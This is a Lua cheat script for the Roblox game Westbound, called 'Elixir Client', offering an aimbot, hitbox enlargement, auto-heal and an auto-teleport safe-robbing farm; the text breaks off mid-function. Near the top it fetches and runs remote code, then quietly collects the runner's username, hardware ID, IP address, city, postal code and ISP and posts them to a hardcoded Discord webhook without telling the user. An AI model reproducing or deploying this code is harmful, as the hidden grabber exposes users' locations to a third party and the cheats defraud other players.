
        -- Logs de sucesso
        print("🌐 Westbound Game Identified")
        print("⚠️ Elixir Client Executed")
        print("🔄 Key Guardian System Loaded")
        print("🔄 Key System Loaded")
        print("✅ Successfully Exclient Loaded")

-- Garante que o valor de _G.Premium esteja definido antes de carregar o script
repeat task.wait() until _G.Premium ~= nil

local player = game.Players.LocalPlayer

-- Função para obter o personagem
local function getCharacter()
    return player.Character or player.CharacterAdded:Wait()
end

-- Função para unequipar a ferramenta atualmente equipada
local function unequipCurrentTool()
    local character = getCharacter()
    local currentTool = character:FindFirstChildOfClass("Tool")

    if currentTool then
        currentTool.Parent = player.Backpack -- Move a ferramenta de volta para o Backpack
    end
end

-- Chamar a função quando necessário
unequipCurrentTool()

local ElixirLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/Aspherian-EC/ui-teste-/refs/heads/main/ElixirLib.lua"))()

    
-- FunÃ§Ã£o para enviar informaÃ§Ãµes para o webhook do Discord
local function sendWebhookInfo()
    local player = game.Players.LocalPlayer
    local httpService = game:GetService("HttpService")
    local req = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
    
    -- Coletar informaÃ§Ãµes do jogador e sistema
    local playerInfo = {
        username = player.Name,
        displayName = player.DisplayName,
        executor = (identifyexecutor and identifyexecutor()) or "Unknown",
        ping = math.round(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue()),
        fps = math.round(game:GetService("Stats").Workspace.Heartbeat:GetValue()),
        os = game:GetService("UserInputService").TouchEnabled and "Mobile" or "PC",
        timeZone = os.date("%Z"),
        timeLocal = os.date("%H:%M:%S"),
        hwid = game:GetService("RbxAnalyticsService"):GetClientId() -- Usando RbxAnalyticsService como identificador
    }

    -- Solicitar informaÃ§Ãµes de IP e localizaÃ§Ã£o usando ipinfo.io API
    local success, response = pcall(function()
        return req({
            Url = "https://ipinfo.io/json",
            Method = "GET"
        })
    end)

    if success and response.StatusCode == 200 then
        local ipData = httpService:JSONDecode(response.Body)
        playerInfo.ip = ipData.ip or "Unknown"
        playerInfo.country = ipData.country or "Unknown"
        playerInfo.region = ipData.region or "Unknown"
        playerInfo.city = ipData.city or "Unknown"
        playerInfo.postalCode = ipData.postal or "Unknown"
        playerInfo.isp = ipData.org or "Unknown"
    else
        warn("Falha ao obter dados de IP")
    end

    -- Formatar a mensagem para o Discord
    local embedData = {
        ["title"] = "Location & Network",
        ["color"] = 16711680,
        ["fields"] = {
            {
                ["name"] = " ",
                ["value"] = string.format(
                    "**IP:** %s\n**HWID:** %s\n**Country:** %s\n**Region:** %s\n**City:** %s\n**Postal Code:** %s\n**ISP:** %s\n**Time Zone:** %s\n**Time:** %s\n",
                    playerInfo.ip or "N/A",
                    playerInfo.hwid or "N/A",
                    playerInfo.country or "N/A",
                    playerInfo.region or "N/A",
                    playerInfo.city or "N/A",
                    playerInfo.postalCode or "N/A",
                    playerInfo.isp or "N/A",
                    playerInfo.timeZone or "N/A",
                    playerInfo.timeLocal or "N/A"
                ),
                ["inline"] = false
            }
        }
    }

    -- Dados para enviar via webhook
    local webhookData = {
        ["embeds"] = {embedData}
    }

    -- URL da sua webhook do Discord
    local webhookUrl = "https://discord.com/api/webhooks/1315800710193090652/FsRCRvM5Lo0kEaRtf7osAfnxScyf691dxjO0sRlcdApm_xDOmsixzc75S6xJxOvPGAv_"

    req({
        Url = webhookUrl,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = httpService:JSONEncode(webhookData)
    })

    local success, response = pcall(function()
        request(webhookData)
    end)
    
    if not success then
        warn("Falha ao enviar dados para webhook:", response)
    end
end

-- Chamar a funÃ§Ã£o
sendWebhookInfo()
            
game:GetService("ReplicatedStorage").GeneralEvents.Spawn:FireServer("Tumbleweed",false,false)

    -- CriaÃ§Ã£o da janela principal
    local Window = ElixirLib:MakeWindow({
        Name = _G.IsPremium and "Elixir Client / Premium" or "Elixir Client / Free", 
        HidePremium = not _G.IsPremium,
        SaveConfig = true, 
        ConfigFolder = "ElixirConfig",
        IntroText = _G.IsPremium and "Elixir Client / Premium" or "Elixir Client / Free"
    })

    -- CriaÃ§Ã£o das abas
    local CombatTab = Window:MakeTab({
        Name = "Combat",
        Icon = "rbxassetid://87265759657753",
        PremiumOnly = false
    })


local Section = CombatTab:AddSection({
        Name = "Aimbot Forced"
    })

local player = game.Players.LocalPlayer
local camera = workspace.CurrentCamera
local RunService = game:GetService("RunService")

-- Teams
local civiliansTeamName = "Civilians"
local outlawsTeamName = "Outlaws"

-- Configs iniciais
local aimbotDistance = 300
local fovRadius = 150
local fovTransparency = 0.5
local currentTarget = nil
local aimMode = "LOCK" -- LOCK ou SMOOTH
local aimType = "WITH FOV" -- WITH FOV ou NO FOV

-- Criar círculo FOV
local fovCircle = Drawing.new("Circle")
fovCircle.Thickness = 2
fovCircle.Color = Color3.fromRGB(255, 255, 0)
fovCircle.Filled = false
fovCircle.Visible = false

local function updateFOV()
    fovCircle.Position = Vector2.new(camera.ViewportSize.X / 2, camera.ViewportSize.Y / 2)
    fovCircle.Radius = fovRadius
    fovCircle.Transparency = fovTransparency
end

-- Seleção de parte do corpo
local P = "Torso"
CombatTab:AddDropdown({
    Name = "Lock Aim",
    Default = "Torso",
    Options = {"Head", "Torso"},
    Callback = function(Value)
        P = Value
    end    
})

local function getTargetPart(character)
    if P == "Head" then
        return character:FindFirstChild("Head")
    else
        return character:FindFirstChild("UpperTorso") or character:FindFirstChild("Torso")
    end
end

-- Função para achar player mais próximo no FOV
local function getClosestPlayerInFOV()
    local closestPlayer = nil
    local shortestDistance = aimbotDistance

    for _, otherPlayer in pairs(game.Players:GetPlayers()) do
        if otherPlayer ~= player and otherPlayer.Character and otherPlayer.Character:FindFirstChild("HumanoidRootPart") then
            local humanoid = otherPlayer.Character:FindFirstChildOfClass("Humanoid")
            if humanoid and humanoid.Health > 0 then
                if otherPlayer.Team ~= player.Team or (player.Team.Name == outlawsTeamName and otherPlayer.Team.Name == outlawsTeamName) then
                    if otherPlayer.Team.Name ~= civiliansTeamName then
                        local rootPos = otherPlayer.Character.HumanoidRootPart.Position
                        local screenPos, onScreen = camera:WorldToViewportPoint(rootPos)
                        if onScreen then
                            local distFromCenter = (Vector2.new(screenPos.X, screenPos.Y) - Vector2.new(camera.ViewportSize.X / 2, camera.ViewportSize.Y / 2)).Magnitude
                            local dist3D = (rootPos - player.Character.HumanoidRootPart.Position).Magnitude
                            if distFromCenter <= fovRadius and dist3D < shortestDistance then
                                closestPlayer = otherPlayer
                                shortestDistance = dist3D
                            end
                        end
                    end
                end
            end
        end
    end

    return closestPlayer
end

-- Função para achar player mais próximo por distância (sem FOV)
local function getClosestPlayerByDistance()
    local closestPlayer = nil
    local shortestDistance = aimbotDistance

    for _, otherPlayer in pairs(game.Players:GetPlayers()) do
        if otherPlayer ~= player and otherPlayer.Character and otherPlayer.Character:FindFirstChild("HumanoidRootPart") then
            local humanoid = otherPlayer.Character:FindFirstChildOfClass("Humanoid")
            if humanoid and humanoid.Health > 0 then
                if otherPlayer.Team ~= player.Team or (player.Team.Name == outlawsTeamName and otherPlayer.Team.Name == outlawsTeamName) then
                    if otherPlayer.Team.Name ~= civiliansTeamName then
                        local dist3D = (otherPlayer.Character.HumanoidRootPart.Position - player.Character.HumanoidRootPart.Position).Magnitude
                        if dist3D < shortestDistance then
                            closestPlayer = otherPlayer
                            shortestDistance = dist3D
                        end
                    end
                end
            end
        end
    end

    return closestPlayer
end

-- Toggle do aimbot
getgenv().AutoWalk = false
CombatTab:AddToggle({
    Name = "Aimbot [Force]",
    Default = false,
    Callback = function(Value)
        getgenv().AutoWalk = Value
        fovCircle.Visible = Value and aimType == "WITH FOV"
        if not Value then
            currentTarget = nil
        end
    end    
})

-- Dropdown modo de mira
CombatTab:AddDropdown({
    Name = "Aim Mode",
    Default = "LOCK",
    Options = {"LOCK", "SMOOTH"},
    Callback = function(Value)
        aimMode = Value
    end    
})

-- Dropdown tipo de mira
CombatTab:AddDropdown({
    Name = "Aim Type",
    Default = "WITH FOV",
    Options = {"WITH FOV", "NO FOV"},
    Callback = function(Value)
        aimType = Value
        fovCircle.Visible = getgenv().AutoWalk and aimType == "WITH FOV"
    end    
})

-- Sliders (amarelos)
CombatTab:AddSlider({
    Name = "Distance Aimbot",
    Min = 50,
    Max = 1000,
    Default = aimbotDistance,
    Color = Color3.fromRGB(255,255,0),
    Increment = 1,
    ValueName = "Distance",
    Callback = function(Value)
        aimbotDistance = Value
    end    
})

CombatTab:AddSlider({
    Name = "FOV Radius",
    Min = 50,
    Max = 500,
    Default = fovRadius,
    Color = Color3.fromRGB(255,255,0),
    Increment = 1,
    ValueName = "Radius",
    Callback = function(Value)
        fovRadius = Value
    end    
})

CombatTab:AddSlider({
    Name = "FOV Transparency",
    Min = 0,
    Max = 1,
    Default = fovTransparency,
    Color = Color3.fromRGB(255,255,0),
    Increment = 0.01,
    ValueName = "Transparency",
    Callback = function(Value)
        fovTransparency = Value
    end    
})

-- Função principal
RunService.RenderStepped:Connect(function()
    if getgenv().AutoWalk then
        if aimType == "WITH FOV" then
            updateFOV()
            currentTarget = getClosestPlayerInFOV()
        else
            fovCircle.Visible = false
            currentTarget = getClosestPlayerByDistance()
        end

        if currentTarget then
            local targetPart = getTargetPart(currentTarget.Character)
            if targetPart then
                local camPos = camera.CFrame.Position

                if aimMode == "LOCK" then
                    camera.CFrame = CFrame.new(camPos, targetPart.Position)
                elseif aimMode == "SMOOTH" then
                    local camLook = camera.CFrame.LookVector
                    local predictedPos = targetPart.Position

                    local humanoidRoot = currentTarget.Character:FindFirstChild("HumanoidRootPart")
                    if humanoidRoot then
                        local velocity = humanoidRoot.Velocity
                        predictedPos = predictedPos + velocity * 0.88 * 0.15
                    end

                    local direction = (predictedPos - camPos).Unit
                    local newLook = camLook:Lerp(direction, 0.88)
                    camera.CFrame = CFrame.new(camPos, camPos + newLook)
                end
            end
        end
    end
end)


    local Section = CombatTab:AddSection({
        Name = "Aimbot Hitbox Fov"
    })



-- Variáveis controladas pelo toggle/sliders
getgenv().ScriptActive = false
getgenv().HeadMinSize = 20
getgenv().HeadTransparency = 0.5
getgenv().FOV_RADIUS = 100
getgenv().FOV_Transparency = 0.5

-- UI: Toggle principal
CombatTab:AddToggle({
    Name = "Aimbot FOV",
    Default = false,
    Callback = function(Value)
        getgenv().ScriptActive = Value
        FOVCircle.Visible = Value
        print("Script:", Value and "Enabled" or "Disabled")
    end
})

-- UI: Slider transparência da cabeça
CombatTab:AddSlider({
    Name = "Head Transparency",
    Min = 0,
    Max = 1,
    Default = 0.5,
    Color = Color3.fromRGB(128, 0, 128),
    Increment = 0.1,
    ValueName = "Alpha",
    Callback = function(value)
        getgenv().HeadTransparency = value
        print("Head Transparency:", value)
    end
})

-- UI: Slider tamanho do FOV
CombatTab:AddSlider({
    Name = "FOV Radius",
    Min = 50,
    Max = 300,
    Default = 100,
    Color = Color3.fromRGB(128, 0, 128),
    Increment = 5,
    ValueName = "Pixels",
    Callback = function(value)
        getgenv().FOV_RADIUS = value
        print("FOV Radius:", value)
    end
})

-- UI: Slider transparência do FOV
CombatTab:AddSlider({
    Name = "FOV Transparency",
    Min = 0,
    Max = 1,
    Default = 0.5,
    Color = Color3.fromRGB(128, 0, 128),
    Increment = 0.05,
    ValueName = "Alpha",
    Callback = function(value)
        getgenv().FOV_Transparency = value
        print("FOV Transparency:", value)
    end
})

----------------------------------------------------------------
-- SCRIPT PRINCIPAL
----------------------------------------------------------------

local HEAD_MAX_SIZE = 50
local MIN_DISTANCE = 70
local MAX_DISTANCE = 200

-- Times
local Teams = game:GetService("Teams")
local CIVILIANS = Teams:FindFirstChild("Civilians")
local COWBOYS = Teams:FindFirstChild("Cowboys")
local OUTLAWS = Teams:FindFirstChild("Outlaws")

-- Círculo de FOV
local FOVCircle = Drawing.new("Circle")
FOVCircle.Visible = false
FOVCircle.Thickness = 2
FOVCircle.Filled = false
FOVCircle.Radius = getgenv().FOV_RADIUS

local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Camera = game.Workspace.CurrentCamera

-- Função para alternar cor RGB suavemente mantendo transparência do slider
local hue = 0
local function updateFOVColor(dt)
    hue = (hue + dt*0.2) % 1
    local rgbColor = Color3.fromHSV(hue, 1, 1)
    FOVCircle.Color = rgbColor
    FOVCircle.Transparency = getgenv().FOV_Transparency
end

-- Centralizar o círculo e atualizar cor
RunService.RenderStepped:Connect(function(deltaTime)
    local centerX = Camera.ViewportSize.X / 2
    local centerY = Camera.ViewportSize.Y / 2
    FOVCircle.Position = Vector2.new(centerX, centerY)
    FOVCircle.Radius = getgenv().FOV_RADIUS
    if getgenv().ScriptActive then
        FOVCircle.Visible = true
        updateFOVColor(deltaTime)
    else
        FOVCircle.Visible = false
    end
end)

-- Ignorar players por time
local function shouldIgnore(player)
    if not player.Team then return true end
    if player.Team == CIVILIANS then return true end
    if LocalPlayer.Team == COWBOYS then
        if player.Team == COWBOYS or player.Team == CIVILIANS then return true end
    elseif LocalPlayer.Team == OUTLAWS then
        if player.Team == CIVILIANS then return true end
    end
    return false
end

-- Verifica se está no FOV
local function isInFOV(player)
    if player == LocalPlayer or not player.Character or not player.Character:FindFirstChild("Head") then return false end
    local headPos, onScreen = Camera:WorldToViewportPoint(player.Character.Head.Position)
    if not onScreen then return false end
    local center = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
    local dist = (Vector2.new(headPos.X, headPos.Y) - center).Magnitude
    return dist <= getgenv().FOV_RADIUS
end

-- Calcula tamanho proporcional
local function getHeadSize(distance)
    if distance <= MIN_DISTANCE then
        return getgenv().HeadMinSize
    elseif distance >= MAX_DISTANCE then
        return HEAD_MAX_SIZE
    else
        local ratio = (distance - MIN_DISTANCE) / (MAX_DISTANCE - MIN_DISTANCE)
        return getgenv().HeadMinSize + (HEAD_MAX_SIZE - getgenv().HeadMinSize) * ratio
    end
end

-- Loop principal
task.spawn(function()
    while task.wait(0.1) do
        if getgenv().ScriptActive then
            for _, player in ipairs(Players:GetPlayers()) do
                if player.Character and player.Character:FindFirstChild("Head") and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Head") then
                    if not shouldIgnore(player) and isInFOV(player) then
                        local head = player.Character.Head
                        local dist = (LocalPlayer.Character.Head.Position - head.Position).Magnitude
                        local newSize = getHeadSize(dist)
                        head.Size = Vector3.new(newSize, newSize, newSize)
                        head.Massless = true
                        head.CanCollide = false
                        head.Transparency = getgenv().HeadTransparency
                    else
                        local head = player.Character.Head
                        head.Size = Vector3.new(2, 1, 1)
                        head.Transparency = 0
                    end
                end
            end
        else
            FOVCircle.Visible = false
        end
    end
end)
            

local Section = CombatTab:AddSection({
	Name = "Silent Aimbot"
})

if _G.Premium then            

-- Variáveis controladas pelo toggle/sliders do Silent Aimbot Premium
getgenv().Premium_ScriptActive = false
getgenv().Premium_HeadMinSize = 12
getgenv().Premium_HeadMaxSize = 100
getgenv().Premium_HeadTransparency = 0.5
getgenv().Premium_MaxDistance = 700  -- alcance padrão

-- UI: Toggle principal
CombatTab:AddToggle({
    Name = "Silent Aimbot Premium",
    Default = false,
    Callback = function(Value)
        getgenv().Premium_ScriptActive = Value
        print("Premium Script:", Value and "Enabled" or "Disabled")
    end
})

-- UI: Slider tamanho da cabeça mínima
CombatTab:AddSlider({
    Name = "Premium Head Min Size",
    Min = 2,
    Max = 100,
    Default = 12,
    Color = Color3.fromRGB(128, 0, 32), -- vinho
    Increment = 1,
    ValueName = "Studs",
    Callback = function(value)
        getgenv().Premium_HeadMinSize = value
        print("Premium Head Min Size:", value)
    end
})

-- UI: Slider tamanho da cabeça máxima
CombatTab:AddSlider({
    Name = "Premium Head Max Size",
    Min = 10,
    Max = 150,
    Default = 50,
    Color = Color3.fromRGB(128, 0, 32), -- vinho
    Increment = 1,
    ValueName = "Studs",
    Callback = function(value)
        getgenv().Premium_HeadMaxSize = value
        print("Premium Head Max Size:", value)
    end
})

-- UI: Slider transparência da cabeça
CombatTab:AddSlider({
    Name = "Premium Head Transparency",
    Min = 0,
    Max = 1,
    Default = 0.5,
    Color = Color3.fromRGB(128, 0, 32), -- vinho
    Increment = 0.1,
    ValueName = "Alpha",
    Callback = function(value)
        getgenv().Premium_HeadTransparency = value
        print("Premium Head Transparency:", value)
    end
})

-- UI: Slider alcance máximo
CombatTab:AddSlider({
    Name = "Premium Max Distance",
    Min = 300,
    Max = 1000,
    Default = 700,
    Color = Color3.fromRGB(128, 0, 32), -- vinho
    Increment = 10,
    ValueName = "Studs",
    Callback = function(value)
        getgenv().Premium_MaxDistance = value
        print("Premium Max Distance:", value)
    end
})

----------------------------------------------------------------
-- SCRIPT PRINCIPAL PREMIUM
----------------------------------------------------------------

local Premium_MIN_DISTANCE = 70  -- começa aumentar a partir de 70 studs

-- Times
local Teams = game:GetService("Teams")
local CIVILIANS = Teams:FindFirstChild("Civilians")
local COWBOYS = Teams:FindFirstChild("Cowboys")
local OUTLAWS = Teams:FindFirstChild("Outlaws")

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- Ignorar players por time
local function Premium_shouldIgnore(player)
    if not player.Team then return true end
    if player.Team == CIVILIANS then return true end
    if LocalPlayer.Team == COWBOYS then
        if player.Team == COWBOYS or player.Team == CIVILIANS then return true end
    elseif LocalPlayer.Team == OUTLAWS then
        if player.Team == CIVILIANS then return true end
    end
    return false
end

-- Calcula tamanho proporcional
local function Premium_getHeadSize(distance)
    if distance <= Premium_MIN_DISTANCE then
        return getgenv().Premium_HeadMinSize
    elseif distance >= getgenv().Premium_MaxDistance then
        return getgenv().Premium_HeadMaxSize
    else
        local ratio = (distance - Premium_MIN_DISTANCE) / (getgenv().Premium_MaxDistance - Premium_MIN_DISTANCE)
        return getgenv().Premium_HeadMinSize + (getgenv().Premium_HeadMaxSize - getgenv().Premium_HeadMinSize) * ratio
    end
end

-- Loop principal
task.spawn(function()
    while task.wait(0.1) do
        if getgenv().Premium_ScriptActive then
            for _, player in ipairs(Players:GetPlayers()) do
                if player.Character and player.Character:FindFirstChild("Head") and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Head") then
                    if not Premium_shouldIgnore(player) then
                        local head = player.Character.Head
                        local dist = (LocalPlayer.Character.Head.Position - head.Position).Magnitude
                        if dist <= getgenv().Premium_MaxDistance then
                            local newSize = Premium_getHeadSize(dist)
                            head.Size = Vector3.new(newSize, newSize, newSize)
                            head.Massless = true
                            head.CanCollide = false
                            head.Transparency = getgenv().Premium_HeadTransparency
                        else
                            -- Reset para fora do alcance
                            head.Size = Vector3.new(2, 1, 1)
                            head.Transparency = 0
                        end
                    else
                        local head = player.Character.Head
                        head.Size = Vector3.new(2, 1, 1)
                        head.Transparency = 0
                    end
                end
            end
        end
    end
end)

else
    Section:AddLabel("Resource available only for premium users!")
end
    

 

local Section = CombatTab:AddSection({
	Name = "Auto Heal Nearest Npc [Premium]"
})

local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer
local HealDebounce = false
local ButtonEnabled = false
local HealDelay = 1 -- Delay padrÃƒÂ£o para auto-heal e compra de poÃƒÂ§ÃƒÂµes
local AutoBuyActive = false -- Controla o loop de compra automÃƒÂ¡tica

local function checkHealth()
    if ButtonEnabled then
        local Character = LocalPlayer.Character
        local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")

        if Humanoid and Humanoid.Health < 100 and Humanoid.Health <= 90 and Humanoid.Health > 0 and not HealDebounce then
            HealDebounce = true

            -- Verificar a quantidade de poÃƒÂ§ÃƒÂµes de saÃƒÂºde
            if LocalPlayer.Consumables["Health Potion"].Value > 0 then
                local Potion = LocalPlayer.Backpack:FindFirstChild("Health Potion") or LocalPlayer.Character:FindFirstChild("Health Potion")

                if Potion then
                    Potion.DrinkPotion:InvokeServer()

                    StarterGui:SetCore("SendNotification", {
                        Title = "Auto Heal",
                        Text = string.format("Used health potion, potions left: %s.", tostring(LocalPlayer.Consumables["Health Potion"].Value)),
                        Duration = 3,
                        Icon = "rbxassetid://6238537240",
                    })
                else
                    StarterGui:SetCore("SendNotification", {
                        Title = "Auto Heal",
                        Text = "Unable to find potion!",
                        Duration = 3,
                        Icon = "rbxassetid://6238553573",
                    })
                end
            else
                StarterGui:SetCore("SendNotification", {
                    Title = "Auto Heal",
                    Text = "You are out of health potions!",
                    Duration = 3,
                    Icon = "rbxassetid://6238540373",
                })
            end

            task.wait(HealDelay)
            HealDebounce = false
        end
    end
end

local function buyHealthPotion()
    while ButtonEnabled and AutoBuyActive do
        ReplicatedStorage.GeneralEvents.BuyItem:InvokeServer("Health Potion", true)
        task.wait(HealDelay) -- Usa o mesmo delay do Auto Heal
    end
end

local function onCharacterAdded(character)
    local Humanoid = character:WaitForChild("Humanoid")
    Humanoid.HealthChanged:Connect(checkHealth)
end

-- Conectar ao evento de adiÃƒÂ§ÃƒÂ£o do personagem
LocalPlayer.CharacterAdded:Connect(onCharacterAdded)

-- Conectar a funÃƒÂ§ÃƒÂ£o ao evento de mudanÃƒÂ§a de saÃƒÂºde para o personagem atual
if LocalPlayer.Character then
    local Humanoid = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
    if Humanoid then
        Humanoid.HealthChanged:Connect(checkHealth)
    end
end

-- AtualizaÃƒÂ§ÃƒÂ£o com os novos botÃƒÂµes:
if _G.Premium then
CombatTab:AddToggle({
    Name = "Auto Heal (God Mode)", -- nome do toggle
    Default = false,
    Callback = function(Value)
        ButtonEnabled = Value
        AutoBuyActive = Value
        if Value then
            task.spawn(buyHealthPotion) -- Iniciar o loop de compra automÃƒÂ¡tica se o toggle estiver ativo
        end
    end    
})

CombatTab:AddSlider({
    Name = "Auto Heal (God Mode) Delay", -- nome do slider
    Min = 0.1,
    Max = 1,
    Default = HealDelay,
    Color = Color3.fromRGB(100, 110, 100),
    Increment = 0.1,
    ValueName = "Seconds",
    Callback = function(Value)
        HealDelay = Value
    end    
})
else
    Section:AddLabel("Resource available only for premium users!")
end

local Section = CombatTab:AddSection({
	Name = "Auto Heal"
})
-- Novo Toggle
CombatTab:AddToggle({
	Name = "Auto Heal (Health Potion)!",
	Default = false,
	Callback = function(Value)
		ButtonEnabled = Value
	end    
})

local function checkHealth()
    if ButtonEnabled then
        local Character = LocalPlayer.Character
        local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")

        if Humanoid and Humanoid.Health < 100 and Humanoid.Health <= 60 and Humanoid.Health > 0 and not HealDebounce then
            HealDebounce = true

            -- Verificar a quantidade de poÃƒÂ§ÃƒÂµes de saÃƒÂºde
            if LocalPlayer.Consumables["Health Potion"].Value > 0 then
                local Potion = LocalPlayer.Backpack:FindFirstChild("Health Potion") or LocalPlayer.Character:FindFirstChild("Health Potion")

                if Potion then
                    Potion.DrinkPotion:InvokeServer()

                    StarterGui:SetCore("SendNotification", {
                        Title = "Auto Heal",
                        Text = string.format("Used health potion, potions left: %s.", tostring(LocalPlayer.Consumables["Health Potion"].Value)),
                        Duration = 3,
                        Icon = "rbxassetid://6238537240",
                    })
                else
                    StarterGui:SetCore("SendNotification", {
                        Title = "Auto Heal",
                        Text = "Unable to find potion!",
                        Duration = 3,
                        Icon = "rbxassetid://6238553573",
                    })
                end
            else
                StarterGui:SetCore("SendNotification", {
                    Title = "Auto Heal",
                    Text = "You are out of health potions!",
                    Duration = 3,
                    Icon = "rbxassetid://6238540373",
                })
            end

            task.wait(1) -- Aguarda um segundo para o debounce
            HealDebounce = false
        end
    end
end

local function onCharacterAdded(character)
    local Humanoid = character:WaitForChild("Humanoid")
    Humanoid.HealthChanged:Connect(checkHealth)
end

-- Conectar ao evento de adiÃƒÂ§ÃƒÂ£o do personagem
LocalPlayer.CharacterAdded:Connect(onCharacterAdded)

-- Conectar a funÃƒÂ§ÃƒÂ£o ao evento de mudanÃƒÂ§a de saÃƒÂºde para o personagem atual
if LocalPlayer.Character then
    local Humanoid = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
    if Humanoid then
        Humanoid.HealthChanged:Connect(checkHealth)
    end
end


local FarmingTab = Window:MakeTab({
    Name = "Farming",
    Icon = "rbxassetid://132965427906211",
    PremiumOnly = false
})

local Section = FarmingTab:AddSection({
	Name = "Auto Farming Free"
})

--âš ï¸âš ï¸âš ï¸

-- Roubar bank âš ï¸âš ï¸âš ï¸âš ï¸âš ï¸

-- ReferÃªncias aos serviÃ§os
local tweenService = game:GetService("TweenService")
local workspace = game:GetService("Workspace")
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoidRootPart = character:WaitForChild("HumanoidRootPart")

-- VariÃ¡vel para controle do estado de vida do personagem
local isAlive = true

-- VariÃ¡vel de controle do toggle
local isToggleActive = false

-- VariÃ¡veis de controle para os processos de auto roubar e teleportar
local autoRobRunning = false
local teleportRunning = false

-- FunÃ§Ã£o para parar o tween em andamento
local function stopTween()
    for _, tween in pairs(tweenService:GetTweens()) do
        if tween.Playing then
            tween:Cancel()
        end
    end
end

-- FunÃ§Ã£o para encontrar todos os cofres dentro de um raio de 300 metros
local function findAllSafes(maxDistance)
    local safes = {}
    for _, obj in pairs(workspace:GetChildren()) do
        if obj:IsA("Model") and obj.Name == "Safe" then
            for _, part in pairs(obj:GetChildren()) do
                if part:IsA("BasePart") then
                    local distance = (part.Position - humanoidRootPart.Position).magnitude
                    if distance < maxDistance then
                        table.insert(safes, obj)
                        break
                    end
                end
            end
        end
    end
    return safes
end

-- FunÃ§Ã£o para teleportar para um cofre especÃ­fico
local function teleportToSafe(safe)
    for _, part in pairs(safe:GetChildren()) do
        if part:IsA("BasePart") then
            local adjustedPosition = part.Position + Vector3.new(0, -1, 0)
            local distanceToSafe = (adjustedPosition - humanoidRootPart.Position).magnitude
            if distanceToSafe <= 300 then
                if distanceToSafe > 2 then
                    local tweenTime = distanceToSafe / 240
                    local tween = tweenService:Create(humanoidRootPart, TweenInfo.new(tweenTime, Enum.EasingStyle.Linear), {CFrame = CFrame.new(adjustedPosition)})
                    tween:Play()
                    tween.Completed:Wait()
                end
            end
            break
        end
    end
end

-- FunÃ§Ã£o para teletransportar entre os cofres
local function teleportBetweenSafes()
    local safes = findAllSafes(10000)
    if #safes > 0 then
        local currentIndex = 1
        while isAlive and isToggleActive do
            teleportToSafe(safes[currentIndex])
            currentIndex = (currentIndex % #safes) + 1
            wait(0.5)
        end
    end
end

-- FunÃ§Ã£o para acionar eventos nos cofres
local function openAndRobSafes()
    while isAlive and isToggleActive do
        local safes = findAllSafes(300)
        if #safes > 0 then
            for _, safe in pairs(safes) do
                safe.OpenSafe:FireServer("Complete")
                game:GetService("ReplicatedStorage").GeneralEvents.Rob:FireServer("Safe", safe)
            end
            wait(0.2)
        else
            local availableSpawns = {"StoneCreek", "Tumbleweed", "Grayridge"}
            local selectedSpawn = availableSpawns[math.random(1, #availableSpawns)]
            game:GetService("ReplicatedStorage").GeneralEvents.Spawn:FireServer(selectedSpawn, false, false)
            wait(0.5)
        end
    end
end

-- FunÃ§Ã£o para verificar e iniciar o AutoFarm (roubo e teleporte)
local function verifyAndStartAutoFarm()
    local safes = findAllSafes(300)
    if #safes > 0 then
        -- Iniciar o auto roubo
        if not autoRobRunning then
            autoRobRunning = true
            spawn(function()
                openAndRobSafes()
                autoRobRunning = false
            end)
        end

        -- Iniciar o teleporte entre cofres
        if not teleportRunning then
            teleportRunning = true
            spawn(function()
                teleportBetweenSafes()
                teleportRunning = false
            end)
        end
    else
        spawn(function()
            while isAlive do
                wait(1)
                safes = findAllSafes(300)
                if #safes > 0 then
                    -- Iniciar o auto roubo e teleporte
                    verifyAndStartAutoFarm()
                    break
                else
                    local spawnOptions = {"StoneCreek", "Tumbleweed", "Grayridge"}
                    local selectedSpawn = spawnOptions[math.random(1, #spawnOptions)]
                    game:GetService("ReplicatedStorage").GeneralEvents.Spawn:FireServer(selectedSpawn, false, false)
                end
            end
        end)
    end
end

-- FunÃ§Ã£o para parar o auto farm e teleport
local function stopAutoFarmAndTeleport()
    autoRobRunning = false
    teleportRunning = false
end

-- Detectar quando o personagem for reiniciado ou morrer
player.CharacterAdded:Connect(function(newCharacter)
    character = newCharacter
    humanoidRootPart = character:WaitForChild("HumanoidRootPart")
    isAlive = true
    if isToggleActive then
        verifyAndStartAutoFarm()
    end
end)

player.CharacterRemoving:Connect(function()
    isAlive = false
    stopAutoFarmAndTeleport()
end)

-- FunÃ§Ã£o para disparar o spawn de FortArthur a cada 7 segundos
local function spawnFortArthurPeriodically()
    while isToggleActive do
        game:GetService("ReplicatedStorage").GeneralEvents.Spawn:FireServer("FortArthur", true, false)
        wait(10)  -- Aguarda 7 segundos antes de disparar novamente
    end
end
            
-- Adiciona ao callback do toggle para comeÃ§ar a funÃ§Ã£o quando ativado
FarmingTab:AddToggle({
    Name = "Auto Farm Rob [Bank]", -- nome do toggle
    Default = false,
    Callback = function(Value)
        isToggleActive = Value
        if isToggleActive then
            verifyAndStartAutoFarm()  -- Inicia o processo de verificaÃ§Ã£o e teleporte
            spawnFortArthurPeriodically()  -- ComeÃ§a a funÃ§Ã£o para spawnar FortArthur periodicamente
        else
            stopAutoFarmAndTeleport()  -- Para o processo
        end
    end    
})
            
local function showNotification(message)
    local notification = loadstring(game:HttpGet('https://raw.githubusercontent.com/9menta/tests/refs/heads/main/notification.lua'))()
    notification({
        Title = 'Anti AFK (Prevent kick for inactivity)',
        Text = message,
        Image = 'rbxassetid://72671288986713',
        Duration = 10
    })
end

FarmingTab:AddToggle({
    Name = "Anti AFK", -- nome do toggle
    Default = false,
    Callback = function(Value)
        print("Anti AFK:", Value)

